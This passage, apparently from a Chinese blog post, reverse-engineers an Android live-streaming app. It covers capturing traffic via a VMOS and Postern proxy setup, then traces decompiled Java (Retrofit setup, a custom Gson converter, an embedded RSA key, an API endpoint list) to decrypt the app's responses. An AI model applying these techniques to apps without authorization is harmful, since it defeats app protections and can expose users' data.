<code>down.tsfsb.com</code>。<br>前者更多的是处理一些信息，后者则是一些头像，动图之类的资源，后者是明文传输，前者是 <code>key</code>,<code>data</code> 同时传输的加密格式。</p><h3 id="VMOS"><a href="#VMOS" class="headerlink" title="VMOS"></a>VMOS</h3><p>如何在虚拟机中抓包呢？在母机中安装 <code>Postern</code>，设置代理到 <code>192.168.137.1</code>，然后启动 <code>VPN</code>，就可以在VMOS中抓包了。</p><h3 id="CustomGson"><a href="#CustomGson" class="headerlink" title="CustomGson"></a>CustomGson</h3><h4 id="抓到的包"><a href="#抓到的包" class="headerlink" title="抓到的包"></a>抓到的包</h4><div galleryFlag itemscope itemtype="http://schema.org/ImageGallery" class="gallery " data-group='default'><div class='fancybox'><a class='fancybox' pjax-fancybox itemscope itemtype="http://schema.org/ImageObject" itemprop="url" href='/img/2022/tomato/apicap.png' data-fancybox='default' data-caption='apicap.png'><img fancybox itemprop="contentUrl" src="/img/2022/tomato/apicap.png" class="lazyload" data-srcset="/img/2022/tomato/apicap.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="apicap.png"></a><span class='image-caption'>apicap.png</span></div></div><p>如何用<code>key</code>去解密<code>data</code>是关键的。</p><h4 id="api请求解密"><a href="#api请求解密" class="headerlink" title="api请求解密"></a>api请求解密</h4><p>首先在 <code>AndroidManifest.xml</code> 中找到关于 <code>tomato</code>&#x2F;<code>live</code> 的 <code>Activity</code>。<br>出现了一个<code>com.tomatolive.library.ui.activity.live.TomatoLiveActivity</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TomatoLiveActivity</span> <span class="keyword">extends</span> <span class="title class_">BaseActivity</span>&lt;BasePresenter&gt; <span class="keyword">implements</span> <span class="title class_">TomatoLiveFragment</span>.OnFragmentInteractionListener &#123;</span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">// com.tomatolive.library.ui.activity.live.TomatoLiveFragment.OnFragmentInteractionListener</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">updateLiveRoomInfo</span><span class="params">()</span> &#123;</span><br><span class="line">        TomatoLiveSDK.getSingleton().onAllLiveListUpdate(bindToLifecycle(), <span class="keyword">new</span> <span class="title class_">ResultCallBack</span>&lt;List&lt;LiveEntity&gt;&gt;() &#123;</span><br><span class="line">            <span class="comment">/* class com.tomatolive.library.ui.activity.live.TomatoLiveActivity.AnonymousClass3 */</span></span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span> <span class="comment">// com.tomatolive.library.http.ResultCallBack</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onError</span><span class="params">(<span class="type">int</span> i, String str)</span> &#123;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onSuccess</span><span class="params">(List&lt;LiveEntity&gt; list)</span> &#123;</span><br><span class="line">                TomatoLiveActivity.<span class="built_in">this</span>.mLiveList = <span class="keyword">new</span> <span class="title class_">ArrayList</span>(list);</span><br><span class="line">                TomatoLiveActivity.<span class="built_in">this</span>.mPagerAdapter.notifyDataSetChanged();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>之所以这一段引人注目而不是其他的，我想应该是看它有个完整的请求，获取了的结果进行订阅，那其中一定应该有解码。<br>那下面接着看 <code>TomatoLiveSDK</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TomatoLiveSDK</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">SingletonHolder</span> &#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">TomatoLiveSDK</span> <span class="variable">INSTANCE</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TomatoLiveSDK</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> <span class="title function_">TomatoLiveSDK</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.ENCRYPT_API_KEY = ConstantUtils.ENCRYPT_FILE_KEY;</span><br><span class="line">        <span class="comment">// ConstantUtils.ENCRYPT_FILE_KEY 就是RSA的私钥</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">     <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onAllLiveListUpdate</span><span class="params">(LifecycleTransformer lifecycleTransformer)</span> &#123;</span><br><span class="line">        onAllLiveListUpdate(lifecycleTransformer, <span class="literal">null</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onAllLiveListUpdate</span><span class="params">(LifecycleTransformer lifecycleTransformer, ResultCallBack&lt;List&lt;LiveEntity&gt;&gt; resultCallBack)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (AppUtils.isApiService()) &#123;</span><br><span class="line">            Observable&lt;R&gt; observeOn = ApiRetrofit.getInstance().getApiService().getAllListService(<span class="keyword">new</span> <span class="title class_">RequestParams</span>().getPageListParams(<span class="number">1</span>, <span class="number">40</span>)).map(<span class="keyword">new</span> <span class="title class_">ServerResultFunction</span>&lt;HttpResultPageModel&lt;LiveEntity&gt;&gt;(<span class="built_in">this</span>) &#123;</span><br><span class="line">                <span class="comment">/* class com.tomatolive.library.TomatoLiveSDK.AnonymousClass35 */</span></span><br><span class="line">            &#125;).onErrorResumeNext(<span class="keyword">new</span> <span class="title class_">HttpResultFunction</span>()).subscribeOn(Schedulers.io()).observeOn(Schedulers.io());</span><br><span class="line">            <span class="keyword">if</span> (lifecycleTransformer != <span class="literal">null</span>) &#123;</span><br><span class="line">                observeOn.compose(lifecycleTransformer);</span><br><span class="line">            &#125;</span><br><span class="line">            observeOn.subscribe(<span class="keyword">new</span> <span class="title class_">Consumer</span>() &#123;</span><br><span class="line">                <span class="comment">/* class com.tomatolive.library.$$Lambda$TomatoLiveSDK$DatQA3QcolUJn_L_jJkT0gUuuug */</span></span><br><span class="line"></span><br><span class="line">                <span class="meta">@Override</span> <span class="comment">// io.reactivex.functions.Consumer</span></span><br><span class="line">                <span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">accept</span><span class="params">(Object obj)</span> &#123;</span><br><span class="line">                    TomatoLiveSDK.lambda$onAllLiveListUpdate$<span class="number">1</span>(ResultCallBack.<span class="built_in">this</span>, (HttpResultPageModel) obj);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">static</span> <span class="comment">/* synthetic */</span> <span class="keyword">void</span> lambda$onAllLiveListUpdate$<span class="number">1</span>(ResultCallBack resultCallBack, HttpResultPageModel httpResultPageModel) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">if</span> (httpResultPageModel != <span class="literal">null</span>) &#123;</span><br><span class="line">            LiveManagerUtils.getInstance().setLiveList(httpResultPageModel.dataList);</span><br><span class="line">            <span class="keyword">if</span> (resultCallBack != <span class="literal">null</span>) &#123;</span><br><span class="line">                resultCallBack.onSuccess(httpResultPageModel.dataList);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这其中最关键标黄的一行，因为以后的数据就可以被正常处理了。<br>下面看一下<code>ApiRetrofit</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ApiRetrofit</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> ApiService mApiService;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> <span class="title function_">ApiRetrofit</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.mApiService = <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            HttpsUtils.<span class="type">SSLParams</span> <span class="variable">sslSocketFactory</span> <span class="operator">=</span> HttpsUtils.getSslSocketFactory(<span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line">            OkHttpClient.<span class="type">Builder</span> <span class="variable">builder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">OkHttpClient</span>.Builder();</span><br><span class="line">            builder.addInterceptor(<span class="keyword">new</span> <span class="title class_">BaseUrlManagerInterceptor</span>());</span><br><span class="line">            builder.addInterceptor(<span class="keyword">new</span> <span class="title class_">AddHeaderInterceptor</span>());</span><br><span class="line">            builder.addInterceptor(<span class="keyword">new</span> <span class="title class_">SignRequestInterceptor</span>());</span><br><span class="line">            builder.connectTimeout(<span class="number">6</span>, TimeUnit.SECONDS);</span><br><span class="line">            builder.readTimeout(<span class="number">30</span>, TimeUnit.SECONDS);</span><br><span class="line">            builder.writeTimeout(<span class="number">30</span>, TimeUnit.SECONDS);</span><br><span class="line">            builder.sslSocketFactory(sslSocketFactory.sSLSocketFactory, sslSocketFactory.trustManager);</span><br><span class="line">            builder.hostnameVerifier($$Lambda$ApiRetrofit$iu5P2JclTluLIXZx0dZfIDluCk.INSTANCE);</span><br><span class="line">            <span class="type">OkHttpClient</span> <span class="variable">build</span> <span class="operator">=</span> builder.build();</span><br><span class="line">            Retrofit.<span class="type">Builder</span> <span class="variable">builder2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Retrofit</span>.Builder();</span><br><span class="line">            builder2.baseUrl(AppUtils.getApiURl());</span><br><span class="line">            builder2.addConverterFactory(CustomGsonConverterFactory.create());</span><br><span class="line">            builder2.addCallAdapterFactory(RxJava2CallAdapterFactory.create());</span><br><span class="line">            builder2.client(build);</span><br><span class="line">            <span class="built_in">this</span>.mApiService = (ApiService) builder2.build().create(ApiService.class);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* access modifiers changed from: private */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">SingletonHolder</span> &#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">ApiRetrofit</span> <span class="variable">INSTANCE</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ApiRetrofit</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> <span class="title function_">SingletonHolder</span><span class="params">()</span> &#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> ApiRetrofit <span class="title function_">getInstance</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> SingletonHolder.INSTANCE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> ApiService <span class="title function_">getApiService</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.mApiService;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里需要注意：<code>addConverterFactory</code>是<code>Retrofit</code>中用来处理返回数据的一个方法。<br>所以在这里无疑是非常重要的了！<br>下面先看下别的，应该可以猜到，<code>com.tomatolive.library.http.ApiService.java</code>应该是一个集合了各种请求的类。<br>想要查看各种请求或者查看 site map，直接到该类中。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">ApiService</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">BASE_START_LIVE_NOTIFY_URL</span> <span class="operator">=</span> <span class="string">&quot;tl/live/startLiveNotify/&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">BASE_TL_ACTIVITY_URL</span> <span class="operator">=</span> <span class="string">&quot;tl/activity/&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">BASE_TL_ANCHOR_INCOME_SERVER_URL</span> <span class="operator">=</span> <span class="string">&quot;tl/statistic/mobile/anchor/income&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">BASE_TL_ANCHOR_PK_LM_URL</span> <span class="operator">=</span> <span class="string">&quot;tl/anchorPk/lianmai/&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">BASE_TL_ANCHOR_PK_URL</span> <span class="operator">=</span> <span class="string">&quot;tl/anchorPk/&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">BASE_TL_AUDIO_URL</span> <span class="operator">=</span> <span class="string">&quot;tl/audio/&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">BASE_TL_AUDIO_VIDEO_ROOM_ANCHOR_URL</span> <span class="operator">=</span> <span class="string">&quot;tl/audio/videoRoom/anchor/&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">BASE_TL_AUDIO_VIDEO_ROOM_URL</span> <span class="operator">=</span> <span class="string">&quot;tl/audio/videoRoom/&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">BASE_TL_AUDIO_VIDEO_ROOM_USER_URL</span> <span class="operator">=</span> <span class="string">&quot;tl/audio/videoRoom/user/&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">BASE_TL_AUDIO_VOICE_ROOM_ANCHOR_URL</span> <span class="operator">=</span> <span class="string">&quot;tl/audio/voiceRoom/anchor/&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">BASE_TL_AUDIO_VOICE_ROOM_URL</span> <span class="operator">=</span> <span class="string">&quot;tl/audio/voiceRoom/&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">BASE_TL_AUDIO_VOICE_ROOM_USER_URL</span> <span class="operator">=</span> <span class="string">&quot;tl/audio/voiceRoom/user/&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">BASE_TL_AUTH_URL</span> <span class="operator">=</span> <span class="string">&quot;tl/auth/&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">BASE_TL_AUTH_USER_SERVICE_INDEX_URL</span> <span class="operator">=</span> <span class="string">&quot;tl/auth/userService/mobile/index/&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">BASE_TL_CLAN_URL</span> <span class="operator">=</span> <span class="string">&quot;tl/clan/clanAdmin/&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">BASE_TL_EXP_ROOM_ACTION</span> <span class="operator">=</span> <span class="string">&quot;tl/exp/room/action&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">BASE_TL_FOLLOW_SERVER_URL</span> <span class="operator">=</span> <span class="string">&quot;tl/follow/mobile/follow/&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">BASE_TL_GAME_URL</span> <span class="operator">=</span> <span class="string">&quot;tl/shop/game/&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">BASE_TL_GIFT_ANCHOR_INCOME_SERVER_URL</span> <span class="operator">=</span> <span class="string">&quot;tl/gift/mobile/anchor/income/&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">BASE_TL_GIFT_ANCHOR_SERVER_URL</span> <span class="operator">=</span> <span class="string">&quot;tl/gift/anchor/&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">BASE_TL_GIFT_SERVER_URL</span> <span class="operator">=</span> <span class="string">&quot;tl/gift/&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">BASE_TL_GUARD_ANCHOR_INCOME_SERVER_URL</span> <span class="operator">=</span> <span class="string">&quot;tl/guard/mobile/anchor/income/&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">BASE_TL_GUARD_SERVER_URL</span> <span class="operator">=</span> <span class="string">&quot;tl/guard/&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">BASE_TL_GUARD_V1_SERVER_URL</span> <span class="operator">=</span> <span class="string">&quot;tl/guard/v1/guard/&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">BASE_TL_IMPRESSION_URL</span> <span class="operator">=</span> <span class="string">&quot;tl/user/impression/&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">BASE_TL_INDEX_ADV_URL</span> <span class="operator">=</span> <span class="string">&quot;tl/index/adv/&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">BASE_TL_INDEX_CACHE_URL</span> <span class="operator">=</span> <span class="string">&quot;tl/index/cache/&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">BASE_TL_INDEX_LIVE_URL</span> <span class="operator">=</span> <span class="string">&quot;tl/index/live/&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">BASE_TL_INDEX_MOBILE_URL</span> <span class="operator">=</span> <span class="string">&quot;tl/index/mobile/&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">BASE_TL_INDEX_SEARCH_URL</span> <span class="operator">=</span> <span class="string">&quot;tl/index/search/&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">BASE_TL_INDEX_URL</span> <span class="operator">=</span> <span class="string">&quot;tl/index/&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">BASE_TL_INTIMATE_ANCHOR_URL</span> <span class="operator">=</span> <span class="string">&quot;tl/activity/intimate/anchor/&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">BASE_TL_INTIMATE_URL</span> <span class="operator">=</span> <span class="string">&quot;tl/activity/intimate/&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">BASE_TL_INTIMATE_USER_URL</span> <span class="operator">=</span> <span class="string">&quot;tl/activity/intimate/user/&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">BASE_TL_ITEM_GIFT_BOX_SERVER_URL</span> <span class="operator">=</span> <span class="string">&quot;tl/item/giftBox/&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">BASE_TL_ITEM_MOBILE_SERVER_URL</span> <span class="operator">=</span> <span class="string">&quot;tl/item/mobile/&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">BASE_TL_ITEM_PROPS_SERVER_URL</span> <span class="operator">=</span> <span class="string">&quot;tl/item/mobile/props/&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">BASE_TL_ITEM_SERVER_URL</span> <span class="operator">=</span> <span class="string">&quot;tl/item/&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">BASE_TL_ITEM_TASK_BOX_SERVER_URL</span> <span class="operator">=</span> <span class="string">&quot;tl/item/taskBox/&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">BASE_TL_ITEM_USER_PROPS_SERVER_URL</span> <span class="operator">=</span> <span class="string">&quot;tl/item/mobile/userProps/&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">BASE_TL_LIVE_CORE_MOBILE_LIVE_URL</span> <span class="operator">=</span> <span class="string">&quot;tl/liveCore/mobile/live/&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">BASE_TL_LIVE_CORE_URL</span> <span class="operator">=</span> <span class="string">&quot;tl/liveCore/&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">BASE_TL_LIVE_DRAW_URL</span> <span class="operator">=</span> <span class="string">&quot;tl/activity/liveDraw/&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">BASE_TL_LIVE_HISTORY_URL</span> <span class="operator">=</span> <span class="string">&quot;tl/liveHistory/&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">BASE_TL_LIVE_MANGE_MOBILE_MY_LIVE_URL</span> <span class="operator">=</span> <span class="string">&quot;tl/liveManage/mobile/myLive/&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">BASE_TL_LIVE_MANGE_URL</span> <span class="operator">=</span> <span class="string">&quot;tl/liveManage/&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">BASE_TL_LIVE_MOBILE_LIVE_URL</span> <span class="operator">=</span> <span class="string">&quot;tl/live/mobile/live/&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">BASE_TL_LIVE_MOBILE_MY_LIVE_URL</span> <span class="operator">=</span> <span class="string">&quot;tl/live/mobile/myLive/&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">BASE_TL_LIVE_MOBILE_URL</span> <span class="operator">=</span> <span class="string">&quot;tl/live/mobile/&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">BASE_TL_LIVE_TICKET_ROOM_URL</span> <span class="operator">=</span> <span class="string">&quot;tl/live/ticketRoom/&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">BASE_TL_LIVE_URL</span> <span class="operator">=</span> <span class="string">&quot;tl/live/&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">BASE_TL_MESSAGE_URL</span> <span class="operator">=</span> <span class="string">&quot;tl/activity/messageBox/&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">BASE_TL_MOBILE_STATISTICS_SERVER_URL</span> <span class="operator">=</span> <span class="string">&quot;tl/statistic/mobile/statistics/&quot;</span>;</span><br><span class="line">    <span 